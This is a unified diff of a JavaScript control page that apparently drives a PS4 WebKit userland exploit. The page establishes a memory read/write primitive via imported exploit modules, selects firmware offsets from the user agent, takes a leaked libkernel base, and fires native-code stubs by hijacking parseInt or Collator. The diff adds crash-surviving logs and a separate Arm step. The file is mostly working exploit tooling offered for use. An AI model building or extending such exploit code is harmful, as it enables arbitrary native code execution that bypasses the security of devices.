@@ -1,32 +1,51 @@
-/** Minimal UI for stub_call.js — direct stub entry, zero ROP slab. */
+/** stub_call.js UI — crash-safe logs survive tab death. */
 import { int64 } from "./int64.js";
 import { offsetsFor } from "./ps4_offsets_userland.js";
 import { installWindowP, pairStatus } from "./mem.js";
-import { establishPrimitive, trimExploitDebris } from "./core.js?v=stub-core-1";
+import { establishPrimitive, trimExploitDebris } from "./core.js?v=stub-core-2";
+import { createCrashLog } from "./log_persist.js";
 import {
-    fireStubSwapParseInt, fireCollatorStub, pinCollatorStub, verifyStubSwapArm,
-} from "./stub_call.js?v=stub-1";
+    fireStubSwapParseInt, fireCollatorStub, pinCollatorStub,
+    STUB_LAST_STEP_KEY,
+} from "./stub_call.js?v=stub-3";
 
-const BUILD = "stub-page-1";
+const BUILD = "stub-page-3";
 const params = new URLSearchParams(location.search);
 let lines = [], ready = false, busy = false, collatorPin = null;
 const retain = [];
 
+const crashLog = createCrashLog({
+    ssLog: "wk-stub-log",
+    ssState: "wk-stub-state",
+    ssBuild: "wk-stub-build",
+    buildId: BUILD,
+    maxLines: 120,
+    flushMs: 200,
+    critical: /^(FAIL|ERROR|STUB|PRIMITIVE|BOOT|SKIP|FIRE|TRIM|PIN)/,
+});
+
 function $(id) { return document.getElementById(id); }
+
 function log(tag, d) {
     const line = tag + (d ? "  " + d : "");
     lines.push(line);
-    if (lines.length > 100) lines.shift();
-    try {
-        const p = sessionStorage.getItem("wk-stub-log") || "";
-        sessionStorage.setItem("wk-stub-log", (p ? p + "\n" : "") + line);
-    } catch (_) { }
+    if (lines.length > 120) lines.shift();
+    crashLog.append(line, tag);
     const o = $("out");
-    if (o) { o.textContent = lines.join("\n"); o.scrollTop = o.scrollHeight; }
+    if (o) {
+        o.textContent = lines.join("\n");
+        o.scrollTop = o.scrollHeight;
+    }
 }
+
+function flushLog() {
+    crashLog.flushSync();
+}
+
 function state(msg, cls) {
     const s = $("state");
     if (s) { s.textContent = msg; s.className = cls || ""; }
+    crashLog.persistState(msg, cls || "");
 }
 
 function parseAddr(raw) {
@@ -55,8 +74,24 @@ function lkFromInput() {
 
 function stubMode() {
     const q = params.get("stub");
-    if (q === "collator" || q === "arm") return q;
+    if (q === "collator" || q === "arm" || q === "fire") return q;
     return "parseint";
+}
+
+function stubOpts() {
+    return {
+        log: log,
+        flush: flushLog,
+        stubKind: params.get("stubkind") || "all",
+        useTextarea: params.get("arg") !== "1",
+    };
+}
+
+function loadEffectiveOff() {
+    const detected = offsetsFor(navigator.userAgent);
+    if (!detected.off)
+        throw new Error("unknown FW UA=" + (navigator.userAgent || "?").slice(0, 60));
+    return detected.off;
 }
 
 function syncRadios() {
@@ -66,83 +101,121 @@ function syncRadios() {
     });
 }
 
+function showLastCrashStep() {
+    try {
+        const last = sessionStorage.getItem(STUB_LAST_STEP_KEY);
+        if (last) log("LAST-CRASH-STEP", last);
+        const prev = sessionStorage.getItem("wk-stub-log");
+        if (prev) {
+            lines = prev.split("\n").filter(Boolean).slice(-100);
+            const o = $("out");
+            if (o) o.textContent = lines.join("\n");
+        }
+    } catch (_) { }
+}
+
 async function runStart() {
     if (busy || ready) return;
     busy = true;
     log("BOOT", BUILD + " mode=" + stubMode());
+    flushLog();
     try {
         const carrier = await establishPrimitive({
             maxAttempts: 0,
             skipTrimDebris: true,
-            onEvent: (t, d) => { if (/PRIMITIVE|FAIL|ERROR|READ-PRIMITIVE/i.test(t)) log(t, d || ""); },
+            onEvent: (t, d) => {
+                if (/PRIMITIVE|FAIL|ERROR|READ-PRIMITIVE|ATTEMPT/i.test(t)) {
+                    log(t, d || "");
+                    flushLog();
+                }
+            },
         });
         installWindowP(carrier, { promote: false });
         window._wkCarrier = carrier;
-        if (!window.p) throw new Error("no p");
+        if (!window.p) throw new Error("no window.p");
         try { trimExploitDebris(); log("TRIM", "ok"); } catch (_) { }
         if (pairStatus.state === "broken") throw new Error("pair broken");
         if (!carrier.textarea) throw new Error("no carrier.textarea");
-        log("PRIMITIVE-OK", "textarea=" + carrier.textareaAddress
-            + " native=" + (carrier.native && carrier.native.nativeFn || "?"));
+        log("PRIMITIVE-OK", "ta=0x" + (carrier.textareaAddress || "?")
+            + " nativeFn=" + (carrier.native && carrier.native.nativeFn || "?"));
         if (stubMode() === "collator") {
             collatorPin = pinCollatorStub(retain);
-            log("PIN-OK", "collator arena ready");
+            log("PIN-OK", "collator arena");
         }
         ready = true;
         $("btn-fire").disabled = false;
-        state("ready — paste lk → Fire", "ok");
+        $("btn-arm").disabled = false;
+        state("ready — Arm first, then Fire", "ok");
+        flushLog();
     } catch (e) {
-        log("FAIL", e.message || String(e));
-        state("failed", "bad");
+        log("FAIL", (e.message || String(e)) + (e.stack ? "\n" + e.stack : ""));
+        state("Start failed", "bad");
+        flushLog();
     } finally {
         busy = false;
+    }
+}
+
+function runArm() {
+    if (busy || !ready || !window.p) return;
+    const lk = lkFromInput();
+    if (!lk) { log("SKIP", "paste lk"); state("need lk", "bad"); flushLog(); return; }
+    busy = true;
+    try {
+        const off = loadEffectiveOff();
+        log("ARM-TAP", "lk=" + lk);
+        const r = fireStubSwapParseInt(window.p, off, lk, Object.assign({}, stubOpts(), { armOnly: true }));
+        log("ARM-OK", r.stubTag + " mainMf=" + r.mainMf);
+        state("arm OK — try Fire", "ok");
+    } catch (e) {
+        log("ARM-FAIL", e.message || String(e));
+        state("arm failed", "bad");
+    } finally {
+        busy = false;
+        flushLog();
     }
 }
 
 function runFire() {
     if (busy || !ready || !window.p) return;
     const lk = lkFromInput();
-    if (!lk) { log("SKIP", "paste lk from 2e Leak+lk"); state("need lk", "bad"); return; }
-    const off = offsetsFor(navigator.userAgent).off;
+    if (!lk) { log("SKIP", "paste lk"); state("need lk", "bad"); flushLog(); return; }
     const mode = stubMode();
     busy = true;
-    log("FIRE", mode + " lk=" + lk);
+    log("FIRE-TAP", mode + " lk=" + lk);
+    flushLog();
     try {
         const p = window.p;
-        const carrier = window._wkCarrier;
+        const off = loadEffectiveOff();
+        const opts = Object.assign({}, stubOpts(), { carrier: window._wkCarrier });
         if (mode === "arm") {
-            const v = verifyStubSwapArm(p, off, lk, { stubKind: "stub20" });
-            log(v.ok ? "ARM-OK" : "ARM-FAIL", "mainMf=" + v.mainMf + " got=" + v.got + " want=" + v.want);
-            state(v.ok ? "arm OK" : "arm fail", v.ok ? "ok" : "bad");
+            runArm();
             return;
         }
         if (mode === "collator") {
             if (!collatorPin) collatorPin = pinCollatorStub(retain);
-            const r = fireCollatorStub(p, collatorPin, lk, off, { stubKind: "stub20" });
-            log("STUB-OK", r.path + " stub=" + r.stub + " pre=" + r.pre + " result=" + r.result);
-            state(Number.isFinite(r.result) ? "collator stub fired" : "bad result", "ok");
+            const r = fireCollatorStub(p, collatorPin, lk, off, opts);
+            log("STUB-OK", r.path + " result=" + r.result);
+            state("collator done", "ok");
             return;
         }
-        const r = fireStubSwapParseInt(p, off, lk, { carrier, stubKind: "stub20" });
-        log("STUB-OK", r.path + " stub=" + r.stubTag
-            + " mainMf=" + r.mainMf + " arg=" + r.fireArg + " jsResult=" + r.result);
-        const pid = (typeof r.result === "number" && r.result > 0 && r.result < 1000000)
-            ? r.result : null;
-        state(pid ? "getpid? " + pid : "survived — check jsResult", pid ? "ok" : "warn");
+        const r = fireStubSwapParseInt(p, off, lk, opts);
+        log("STUB-OK", r.stubTag + " arg=" + r.fireArg + " js=" + r.result);
+        state("survived js=" + r.result, "ok");
     } catch (e) {
-        log("STUB-FAIL", e.message || String(e));
-        state("stub fire failed", "bad");
+        log("STUB-FAIL", (e.message || String(e)) + (e.stack ? "\n" + e.stack : ""));
+        state("stub failed — reload, read LAST-CRASH-STEP", "bad");
     } finally {
         busy = false;
+        flushLog();
     }
 }
 
 function init() {
-    try {
-        const prev = sessionStorage.getItem("wk-stub-log");
-        if (prev) lines = prev.split("\n").slice(-80);
-    } catch (_) { }
-    $("out").textContent = lines.join("\n");
+    crashLog.startAutoFlush();
+    showLastCrashStep();
+    log("INIT", BUILD + " — logs in wk-stub-log sessionStorage");
+    flushLog();
     syncRadios();
     document.querySelectorAll('input[name="stub"]').forEach(function (el) {
         el.addEventListener("change", function () {
@@ -152,6 +225,7 @@ function init() {
         });
     });
     $("btn-start").onclick = runStart;
+    $("btn-arm").onclick = runArm;
     $("btn-fire").onclick = runFire;
     const saved = sessionStorage.getItem("wk-libkernelBase") || sessionStorage.getItem("wk-lastFnPtr");
     if (saved) $("lk-in").value = saved;
